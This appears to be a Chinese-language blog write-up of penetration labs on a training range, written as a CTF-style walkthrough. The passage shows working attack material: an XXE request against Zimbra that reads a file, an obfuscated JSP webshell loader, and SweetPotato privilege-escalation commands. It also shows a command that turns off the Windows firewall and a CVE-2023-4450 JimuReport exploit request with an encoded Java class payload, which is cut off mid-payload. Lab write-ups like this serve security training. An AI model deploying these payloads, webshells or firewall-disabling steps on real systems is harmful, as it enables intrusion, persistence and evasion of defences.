<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129013248486.png"
	width="1028"
	height="434"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129013248486_hu16282099829642546147.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129013248486_hu12283162634776559289.png 1024w"
	loading="lazy"
	
		alt="image-20260129013248486"
	
	
		class="gallery-image" 
		data-flex-grow="236"
		data-flex-basis="568px"
	
></p>
<p>传<code>fscan</code>，<code>stowaway</code></p>
<p>查出一个<code>56</code>有个<code>443</code>端口</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129013723021.png"
	width="312"
	height="381"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129013723021_hu11905420634129797555.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129013723021_hu15709141919769585665.png 1024w"
	loading="lazy"
	
		alt="image-20260129013723021"
	
	
		class="gallery-image" 
		data-flex-grow="81"
		data-flex-basis="196px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">listen
</span></span><span class="line"><span class="cl">1
</span></span><span class="line"><span class="cl">8899
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">./linux_x64_agent -c 10.0.0.65:8899
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129014520096.png"
	width="1428"
	height="336"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129014520096_hu2924622888148894562.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129014520096_hu10349187903449200238.png 1024w"
	loading="lazy"
	
		alt="image-20260129014520096"
	
	
		class="gallery-image" 
		data-flex-grow="425"
		data-flex-basis="1020px"
	
></p>
<p>我发现这里二级三级代理的反向代理还挺好用的</p>
<p>是个<code>zimbra</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129015258388.png"
	width="905"
	height="427"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129015258388_hu8040826846403505520.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129015258388_hu17727548554250746607.png 1024w"
	loading="lazy"
	
		alt="image-20260129015258388"
	
	
		class="gallery-image" 
		data-flex-grow="211"
		data-flex-basis="508px"
	
></p>
<p>用tscan可以扫出有xxe的漏洞</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129015516351.png"
	width="904"
	height="196"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129015516351_hu2300162430944445692.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129015516351_hu6425822976078812569.png 1024w"
	loading="lazy"
	
		alt="image-20260129015516351"
	
	
		class="gallery-image" 
		data-flex-grow="461"
		data-flex-basis="1106px"
	
></p>
<p>直接发包读取flag即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /Autodiscover/Autodiscover.xml HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 10.1.1.56
</span></span><span class="line"><span class="cl">Cookie: ZM_TEST=true
</span></span><span class="line"><span class="cl">Cache-Control: max-age=0
</span></span><span class="line"><span class="cl">Sec-Ch-Ua: &#34;Not?A_Brand&#34;;v=&#34;99&#34;, &#34;Chromium&#34;;v=&#34;130&#34;
</span></span><span class="line"><span class="cl">Sec-Ch-Ua-Mobile: ?0
</span></span><span class="line"><span class="cl">Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9
</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class="line"><span class="cl">Sec-Fetch-Site: none
</span></span><span class="line"><span class="cl">Sec-Fetch-Mode: navigate
</span></span><span class="line"><span class="cl">Sec-Fetch-User: ?1
</span></span><span class="line"><span class="cl">Sec-Fetch-Dest: document
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
</span></span><span class="line"><span class="cl">Priority: u=0, i
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">Content-Length: 316
</span></span><span class="line"><span class="cl">Content-Type: text/xml
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &#34;file:/root/flag.txt&#34; &gt;]&gt;&lt;Autodiscover xmlns=&#34;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&#34;&gt;&lt;Request&gt;&lt;EMailAddress&gt;test@test.com&lt;/EMailAddress&gt;&lt;AcceptableResponseSchema&gt;&amp;xxe;&lt;/AcceptableResponseSchema&gt;&lt;/Request&gt;&lt;/Autodiscover&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129020008007.png"
	width="936"
	height="565"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129020008007_hu772328869588041063.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129020008007_hu469198253706967273.png 1024w"
	loading="lazy"
	
		alt="image-20260129020008007"
	
	
		class="gallery-image" 
		data-flex-grow="165"
		data-flex-basis="397px"
	
></p>
<p>打到这里本来就可以结束了，但是我还想着要不要上线最后一个靶机</p>
<p>就这样吧，最后一个靶机也不拿shell了</p>
<p>奇怪的就是这个靶场没有域控啥的，都打不了PTH</p>
<p>就这样吧</p>
<h3 id="总结-2">总结
</h3><p>总结一下，这个靶场关于免杀的东西还是很多的，学到了很多东西，一开始关于CS的东西也研究了很久，免杀也搞了很久，现在属于是比较通透了，可以着手写一个知识点总结了</p>
<h2 id="sweetcake">SweetCake
</h2><h3 id="flag1-12">flag1
</h3><h4 id="知识点struts2漏洞利用php免杀土豆提权">知识点：struts2漏洞利用、php免杀、土豆提权
</h4><p>入口ip为``老样子<code>fscan</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130155010977.png"
	width="1672"
	height="335"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130155010977_hu14206066822488284673.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130155010977_hu10078034641037952443.png 1024w"
	loading="lazy"
	
		alt="image-20260130155010977"
	
	
		class="gallery-image" 
		data-flex-grow="499"
		data-flex-basis="1197px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130154840685.png"
	width="774"
	height="365"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130154840685_hu265788195045608291.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130154840685_hu10905524207280706052.png 1024w"
	loading="lazy"
	
		alt="image-20260130154840685"
	
	
		class="gallery-image" 
		data-flex-grow="212"
		data-flex-basis="508px"
	
></p>
<p>提示说：有听说有S2框架，可以检测一波，也是直接可以执行命令了</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130155903656.png"
	width="1336"
	height="1019"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130155903656_hu1243733461076333722.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130155903656_hu11494070233466984919.png 1024w"
	loading="lazy"
	
		alt="image-20260130155903656"
	
	
		class="gallery-image" 
		data-flex-grow="131"
		data-flex-basis="314px"
	
></p>
<p>然后上传jsp木马，直接传到根目录就行，这里根目录指的是<code>S2</code>的根目录</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130160938146.png"
	width="1014"
	height="528"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130160938146_hu10702453934083704679.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130160938146_hu10289765541716670007.png 1024w"
	loading="lazy"
	
		alt="image-20260130160938146"
	
	
		class="gallery-image" 
		data-flex-grow="192"
		data-flex-basis="460px"
	
></p>
<p>连接失败了，这里换一个马，最后用的这个，是<code>tscanplus</code>生成的蚁剑免杀<code>jsp</code>（这个免杀性能一般，不过是这里不怎么需要免杀）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;% String H32u8 = request.getParameter(&#34;a&#34;);if (H32u8 != null) { class Eb4S69j9 extends/*Z#￥h*u@!h111tJ4l00*/ClassLoader { Eb4S69j9(ClassLoader LNbQw2) { super(LNbQw2); } public Class H32u8(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = &#34;&#34;;for (int i = 0; i &lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A63qC = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A63qC.getMethod(k, String.class).invoke(A63qC.newInstance(), H32u8);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H32u8);}Class aClass = new Eb4S69j9(Thread.currentThread().getContextClassLoader()).H32u8(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130161636416.png"
	width="1114"
	height="754"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130161636416_hu14867068844975445237.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130161636416_hu17818022700944888547.png 1024w"
	loading="lazy"
	
		alt="image-20260130161636416"
	
	
		class="gallery-image" 
		data-flex-grow="147"
		data-flex-basis="354px"
	
></p>
<p>需要提权</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130161827420.png"
	width="784"
	height="143"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130161827420_hu4874863896613827405.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130161827420_hu8385992324026271592.png 1024w"
	loading="lazy"
	
		alt="image-20260130161827420"
	
	
		class="gallery-image" 
		data-flex-grow="548"
		data-flex-basis="1315px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">whoami /priv
</span></span></code></pre></td></tr></table>
</div>
</div><p>发现开启了这个，尝试用甜土豆提权</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130161950881.png"
	width="865"
	height="361"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130161950881_hu14114716073600936476.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130161950881_hu12254707664697161624.png 1024w"
	loading="lazy"
	
		alt="image-20260130161950881"
	
	
		class="gallery-image" 
		data-flex-grow="239"
		data-flex-basis="575px"
	
></p>
<p>上传甜土豆之后</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SweetPotato.exe -a whoami
</span></span></code></pre></td></tr></table>
</div>
</div><p>提权成功</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130162300853.png"
	width="1162"
	height="465"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130162300853_hu1509005881781802482.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130162300853_hu9953337632911785550.png 1024w"
	loading="lazy"
	
		alt="image-20260130162300853"
	
	
		class="gallery-image" 
		data-flex-grow="249"
		data-flex-basis="599px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SweetPotato.exe -a &#34;type c:\flag.txt&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130162610676.png"
	width="849"
	height="278"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130162610676_hu1927662451082902614.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130162610676_hu3252044574044903458.png 1024w"
	loading="lazy"
	
		alt="image-20260130162610676"
	
	
		class="gallery-image" 
		data-flex-grow="305"
		data-flex-basis="732px"
	
></p>
<h3 id="flag3-9">flag3
</h3><h4 id="知识点积木报表cve-2023-4450">知识点：积木报表CVE-2023-4450
</h4><p>先做一下内网准备，上一下<code>stowaway</code>和<code>CS</code></p>
<p>不出意外就出意外了，发现这台机子居然ping不到主机，要么是防火墙要么是不出网。不过，stowaway可以正向连接上线，但是CS的跳板机不行。所以就先上stowaway了</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130163847236.png"
	width="944"
	height="262"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130163847236_hu12926455405518594478.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130163847236_hu389430303227596084.png 1024w"
	loading="lazy"
	
		alt="image-20260130163847236"
	
	
		class="gallery-image" 
		data-flex-grow="360"
		data-flex-basis="864px"
	
></p>
<p>接下来要成功上线的话，也很简单，有系统权限就是很全能，尝试把防火墙关了就行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SweetPotato.exe -a &#34;netsh advfirewall set allprofiles state off&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后用插件一直无法成功提权，还是用自己的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell C:\Users\Public\SweetPotato.exe -a &#34;C:\Users\Public\1.exe&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130165247241.png"
	width="680"
	height="269"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130165247241_hu13477319817224935095.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130165247241_hu15007285299531705071.png 1024w"
	loading="lazy"
	
		alt="image-20260130165247241"
	
	
		class="gallery-image" 
		data-flex-grow="252"
		data-flex-basis="606px"
	
></p>
<p>有系统权限之后还得关一下杀软，不然会把<code>stowaway</code>删了（第一次打还没有被杀）</p>
<p>忙活半天，开始扫内网吧</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130165825761.png"
	width="670"
	height="428"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130165825761_hu16467452445508221842.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130165825761_hu2260326637526708393.png 1024w"
	loading="lazy"
	
		alt="image-20260130165825761"
	
	
		class="gallery-image" 
		data-flex-grow="156"
		data-flex-basis="375px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130165936331.png"
	width="787"
	height="160"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130165936331_hu6381430551241024021.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130165936331_hu3196710277400721754.png 1024w"
	loading="lazy"
	
		alt="image-20260130165936331"
	
	
		class="gallery-image" 
		data-flex-grow="491"
		data-flex-basis="1180px"
	
></p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>ip</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>172.30.58.42</td>
<td>外网机（拿下）</td>
</tr>
<tr>
<td>172.30.58.77</td>
<td>WIN-UPQLOPM011B 存在web服务</td>
</tr>
<tr>
<td>172.30.58.78</td>
<td>只开放了22端口</td>
</tr>
<tr>
<td>172.30.58.79</td>
<td>WIN-85B7F32VC8H 8085端口存在web服务</td>
</tr>
</tbody>
</table></div>
<p>感觉思路还是很清晰的，先去打有web服务的<code>79、77</code>，然后可能能拿到数据库，可能拿到<code>78</code>的ssh用户和密码</p>
<p>79是积木报表的站，依旧搜索nday</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130172507038.png"
	width="654"
	height="348"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130172507038_hu11335002782297541593.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260130172507038_hu14940616393693406523.png 1024w"
	loading="lazy"
	
		alt="image-20260130172507038"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="451px"
	
></p>
<p>找到一个<code>CVE-2023-4450</code></p>
<p>直接跟着打，这里直接借用其他师傅的poc了</p>
<p>点击新建报表，改包发送两次</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /jmreport/save?previousPage=xxx&amp;jmLink=YWFhfHxiYmI=&amp;token=123123 HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 172.30.58.79:8085
</span></span><span class="line"><span class="cl">Content-Length: 2
</span></span><span class="line"><span class="cl">sec-ch-ua: &#34;Not-A.Brand&#34;;v=&#34;99&#34;, &#34;Chromium&#34;;v=&#34;124&#34;
</span></span><span class="line"><span class="cl">X-Tenant-Id: null
</span></span><span class="line"><span class="cl">JmReport-Tenant-Id: null
</span></span><span class="line"><span class="cl">sec-ch-ua-mobile: ?0
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
</span></span><span class="line"><span class="cl">tenantId: null
</span></span><span class="line"><span class="cl">Content-Type: application/json;charset=UTF-8
</span></span><span class="line"><span class="cl">Accept: application/json, text/plain, */*
</span></span><span class="line"><span class="cl">X-Access-Token: null
</span></span><span class="line"><span class="cl">token: null
</span></span><span class="line"><span class="cl">sec-ch-ua-platform: &#34;Windows&#34;
</span></span><span class="line"><span class="cl">Origin: http://172.30.58.79:8085
</span></span><span class="line"><span class="cl">Sec-Fetch-Site: same-origin
</span></span><span class="line"><span class="cl">Sec-Fetch-Mode: cors
</span></span><span class="line"><span class="cl">Sec-Fetch-Dest: empty
</span></span><span class="line"><span class="cl">Referer: http://172.30.58.79:8085/
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9
</span></span><span class="line"><span class="cl">Cookie: Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1734512727,1734575289,1734580151,1734592701; Hm_lpvt_5819d05c0869771ff6e6a81cdec5b2e8=1734592701; HMACCOUNT=5325E852605ABB9A
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{&#34;designerObj&#34;:{&#34;id&#34;:&#34;123456789&#34;,&#34;name&#34;:&#34;erhuo&#34;,&#34;type&#34;:&#34;datainfo&#34;},&#34;name&#34;:&#34;sheet1&#34;,&#34;freeze&#34;:&#34;A1&#34;,&#34;freezeLineColor&#34;:&#34;rgb(185, 185, 185)&#34;,&#34;styles&#34;:[],&#34;displayConfig&#34;:{},&#34;printConfig&#34;:{&#34;paper&#34;:&#34;A4&#34;,&#34;width&#34;:210,&#34;height&#34;:297,&#34;definition&#34;:1,&#34;isBackend&#34;:false,&#34;marginX&#34;:10,&#34;marginY&#34;:10,&#34;layout&#34;:&#34;portrait&#34;,&#34;printCallBackUrl&#34;:&#34;&#34;},&#34;merges&#34;:[],&#34;rows&#34;:{&#34;0&#34;:{&#34;cells&#34;:{&#34;0&#34;:{&#34;text&#34;:&#34;=(use org.springframework.cglib.core.*;use org.apache.commons.codec.binary.*;ReflectUtils.defineClass(\&#34;org.apache.logging.l.KeyUtils\&#34;, Hex.decodeHex(\&#34;cafebabe0000003401240a005a008d08008e08008f0700900800910a000400920a009300940a009300950800960a002500970800980a0059009908009a08009b08009c08009d08009e07009f0800a00700a10a005900a20700a30800a40a001200a50800a60a005900a70700a80a001b00a90b00aa00ab0800ac0a001400ad0a001200ae0a005900af0a005900b00a005900b10a005900b20700b30800b40700b50900b600b70a001200b80a00b900ba0a00b600bb0a00b900bc0700bd0800be0800bf0800c00700c10a003100c20800c30a001200c40800c50a001200c60800c70800c80800c90700ca0a003a008d0700cb0a003c00cc0700cd0a003e00ce0a003e00cf0a003a00d00a003a00d10a005900d20a00d300d40a00d300ba0a00d300d50a001200d60700d70a001200d80a004800920a001200d90a00b900da0a000400db0a00b900dc0700dd0a004f00920700de0700df0a005100e00a005200920a005900e10a005900e20a005900e30a005200e40700e50700e60100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c6501000d67657455726c5061747465726e01001428294c6a6176612f6c616e672f537472696e673b01000c676574436c6173734e616d6501000f676574426173653634537472696e6701000a457863657074696f6e730700e70100097472616e73666f726d010072284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b5b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b29560700e80100a6284c636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f444f4d3b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f64746d2f44544d417869734974657261746f723b4c636f6d2f73756e2f6f72672f6170616368652f786d6c2f696e7465726e616c2f73657269616c697a65722f53657269616c697a6174696f6e48616e646c65723b295601000a676574436f6e7465787401001428294c6a6176612f6c616e672f4f626a6563743b01000d537461636b4d61705461626c650700b30700a10700a30700e90700ea01000e676574496e746572636570746f720700bd01000e616464496e746572636570746f72010027284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f4f626a6563743b295601000c6465636f6465426173653634010016284c6a6176612f6c616e672f537472696e673b295b4201000e677a69704465636f6d7072657373010006285b42295b420700ca0700cb0700cd0100057365744656010039284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b29560100056765744656010038284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f4f626a6563743b0100046765744601003f284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b07009f0700d701000c696e766f6b654d6574686f6401005d284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0700eb0700ec0700dd0700de0100083c636c696e69743e01000a536f7572636546696c6501000d4b65795574696c732e6a6176610c005b005c0100022f2a0100356f72672e6170616368652e636f6d6d6f6e732e6c616e672e536563757269747948616e646c6572576463496e746572636570746f720100106a6176612f6c616e672f537472696e670109a0483473494141414141414141414a31582b337354787855396f346458794570495241444c62674f6b6755677957415273452b776b594275445857776e52635375342f5378576f30736753794a335a574e307961686164716b37316636534e2f7069375251536c4b51495453555072372b30482b6f58333970656d5a334c57784c7276503173372f567a737964632b2b63652b3464365a2f2f656663326745667864344765736a6d62306975366b5a63706f7a77335679355a71614a656d6b326c70564531432f62696946374b467155356c5456475337593044566d7879365947496244316a44367675385a445264327978737036566e4c4a4c3342496f566f56733143617a5a6e366e46776f6d326454437a4b547371513558355232617342614c426b65394372636f4943594a585a385a6a417874735a4276304267714a79564170764843695535555a334c53504f306e696c794a6a70574e76546970473457314e6962444e6a356773566f7876367651394b6479416a345a67594657724d795235644f47414c624764336f61474e38456479482b384d4949437251386e6968564c4366464769507237567a69657050544e4b425162523131694e34414673565770754150353659564f4e324e6534513246517870527530514e5a31634c354f627436324b366b5250744c7578436c3572696f74753339444d3674435a6d542f696e6965797079526874326665465a677939335a34664f4b6f554b357047474867475a4a792b4a41594f66364868774c4d756f765a38366f2f446c675662745154493372466335763962596135694b35547730564b6e6d704d71435a627641436a337a4155777145544f386b416874543435325a6e764b75434a5357476767517543647436385a5a427574704b3579584b6b73545650667148576c62795a375a32346575546641684a624437413057753456456d646c626149773679774a3534493279696d6165443647374641665251703235556b3371784b694d343